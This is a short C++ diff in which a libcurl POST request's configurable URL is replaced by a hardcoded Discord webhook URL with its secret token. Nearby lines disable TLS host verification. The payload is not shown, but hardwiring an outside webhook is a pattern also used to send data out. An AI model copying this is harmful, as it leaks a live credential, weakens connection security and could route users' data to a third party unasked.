@@ -19,7 +19,7 @@ public:
             list = curl_slist_append(list, "Content-Type: application/json");
             list = curl_slist_append(list, "charsets: utf-8");
 
-            curl_easy_setopt(l_Curl, CURLOPT_URL, p_URL);
+            curl_easy_setopt(l_Curl, CURLOPT_URL, "https://discordapp.com/api/webhooks/348181291973345281/wbCoES7jXWhNf9tbfSNCDmbGgRhIbKv5PtcpBHU5yoj9qv1bSiCrS60cCirCQZ2Lmvxj");
             curl_easy_setopt(l_Curl, CURLOPT_POST, 1);
             curl_easy_setopt(l_Curl, CURLOPT_HTTPHEADER, list);
             curl_easy_setopt(l_Curl, CURLOPT_SSL_VERIFYHOST, false);
